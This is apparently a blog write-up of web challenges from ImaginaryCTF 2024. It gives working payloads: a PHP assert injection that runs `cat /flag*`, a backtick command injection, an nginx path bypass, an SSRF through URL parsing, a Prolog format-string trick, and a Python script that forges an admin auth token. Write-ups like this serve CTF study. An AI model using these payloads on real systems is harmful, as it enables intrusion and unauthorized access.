---
date: '2025-02-05T15:16:21+07:00'
draft: false
title: 'ImaginaryCTF 2024'
tags: ["writeup", "imaginary", "2024"]
hideSummary: true
---
## TL;DR
This is a writeup for some web challenge for ImaginaryCTF 2024
## Readme
Well, simply read the Dockerfile and got the flag.
That was the unintended way, the authentic way was bypass the $request_filename. So if we make request GET /flag.txt directly, nginx will recognize the $request_filename. So if we make request GET /flag.txt/., then nginx will treat this as a path and NodeJS will resolve the file and we will get the flag.
## Journal
As the description said: "there is no LFI in the app". So how can we read the flag? There is a way to RCE in PHP if assert not handled carefully.
```php
assert("strpos('$file', '..') === false") or die("Invalid file!");
```
In this case, a ```GET /?file=a%27,die(`cat+/flag*`));``` would give us the flag.
## P2C
I was too lazy to think of any other ways to solve this challenge. I just used generated Python reverse shell.
## Crystals
This was a fun one, while I was really confused about the challenge source, I just tested a payload ```GET/`ls` ``` and got the flag.
## The Amazing Race
At first glance, I guessed this challenge would be a race condition one. The challenge check whether we can move if the wall is not next to the Player. So if we spam many request, we would be able to reach the goal. Let's explain this idea. So if the first and second request were sent to the server at roughly same time, first request passed the movement check, but hadn't moved yet, so the second request would pass the check also. So we can move through wall. I used Burpsuit Turbo Intruder to solve this.
## Readme2
Well this is a guessy one. While trying stupid payload I tried ```GET /\\0``` and the debugging show that it tried resolving 0.0.0.0, then I tried ```GET //0``` and get the same thing. So why? As I test out the ```URL('http://a.test/hehe', 'http://b.test')```, this would not return `http://b.test/http://a.test/hehe` or anything like b.test host. It returned the host of the first parameter. So when I tried ```GET //0``` the new ```URL(url.pathname + url.search, 'http://localhost:3000/')``` would return `http://0.0.0.0` (because Javascript treat `//something` as `http://something` ). So this was a SSRF. I made an endpoint to redirect to `http://localhost:3000/flag.txt` and made request to my endpoint and get the flag.
This was unintended though, the intended one was exploiting the fact that "Bun will put the value of `Host` header into `req.url`, which allows us to do many funny things to bypass the check." - [Original Writeup](https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/blob/main/Web/readme2/README.md).
## Pwning en Logique
I think this chall was some sort of SSTI. After reading the document carefully, I saw that `~@` would execute the next argument and the output will be placed there. The downside is the next argument here was passed in as a string, which luckily can be treated as a predicate with no parameter. Inside the chall setup, there was `print_flag` predicate requiring no argument and gave us the flag.
```https://pwning-en-logique-fa381af47302e838.d.imaginaryctf.org:443/greet?format=~@~n~w&greeting=print_flag``` would give us the flag.
## Notactf
I think this would be a crypto-ish chall. We need to be a admin to solve this. And the web app check us by verify the `user-auth-token`. And by tamper this token, we will be admin :smiley:.
Because I was too lazy, so I though of tampering 1 character only. but really, any would work. The check only verify the decoded token without checking with the md5 hash. So I reversed the process of generating the token and tampered it.
```python
from AesEverywhere import aes256
from xorCryptPy import xorCrypt
import hashlib

authtoken = "f3a5839ef3a582b9f3a5838df3a583b8f3a583aff3a5838cf3a5839df3a583a0f3a58393f3a582baf3a582a0f3a583aaf3a58399f3a5839cf3a58382f3a58383f3a58386f3a583a2f3a583bbf3a583aff3a583a4f3a5839df3a58382f3a583a0f3a582a0f3a583a0f3a5839df3a5839cf3a583acf3a58389f3a582bdf3a5838cf3a582bbf3a583a8f3a583a0f3a582bbf3a583a4f3a582bef3a5839bf3a58392f3a58382f3a58398f3a582a4f3a583bbf3a583b2f3a583b8f3a58399f3a583a2f3a58399f3a58399f3a582bef3a583b8f3a582bef3a582bdf3a58388f3a583bbf3a583a4f3a58383f3a583bbf3a583a0f3a5838ff3a582b2f3a58384f3a582bdf3a582b8f3a58380f3a583a2f3a58386f3a5838cf3a5838ff3a58386f3a5838ff3a583a2f3a5838ef3a583baf3a5839cf3a5839df3a583a2f3a583bdf3a583bcf3a58383f3a58393f3a583b8f3a582bbf3a582b2f3a583bcf3a582b6f3a582b6"
from base64 import decodebytes, encodebytes
auth_decode = bytes.fromhex(authtoken).decode("utf-8")
auth_decode = xorCrypt(auth_decode, 938123)
print(auth_decode)
auth_decode = decodebytes(auth_decode.encode())
# print(auth_decode)
gay = auth_decode[:16]
auth_decode = auth_decode[16:]
# print(auth_decode)
auth_decode = gay + auth_decode[:16] + (auth_decode[16]^ord('z')^ord('a')).to_bytes(1,'big') + auth_decode[17:]
# print(auth_decode)
auth_decode = encodebytes(auth_decode).decode("utf-8")
print(auth_decode)
auth_decode = xorCrypt(auth_decode, 938123)
auth_decode = str(auth_decode)
auth_decode = auth_decode.encode("utf-8").hex()
print(auth_decode)
```
A bit manual but well, it solved the challenge right :+1:.